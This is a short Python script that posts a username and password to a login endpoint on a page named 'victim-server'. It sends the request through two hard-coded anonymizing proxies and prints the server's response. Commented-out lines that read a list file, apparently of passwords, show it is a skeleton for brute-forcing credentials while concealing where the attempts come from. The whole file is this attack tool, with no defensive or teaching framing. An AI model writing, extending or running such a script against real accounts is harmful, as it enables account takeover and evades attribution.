import requests
import urllib
proxies = {
"http" : "43.239.155.130:32650",
"https":"186.159.6.163:1994"
}
#with open('psl.txt','r') as f:
 #for line in f:
  #line = line.split("\n")
params ={
     'user_name':'gautam',
     'user_pass':'123456789'
  }
a_url = 'https://csarmynepal.000webhostapp.com/victim-server/'
response = requests.post(a_url,params=params,proxies=proxies,allow_redirects=True)
if response.status_code == 200:
 print('Success')
 print(response.content)
elif response.status_code == 301 or response.status_code == 302:
 print('Redirect')
 print(response.headers['Location'])
else:
  print('Error')
  print(response.status_code)
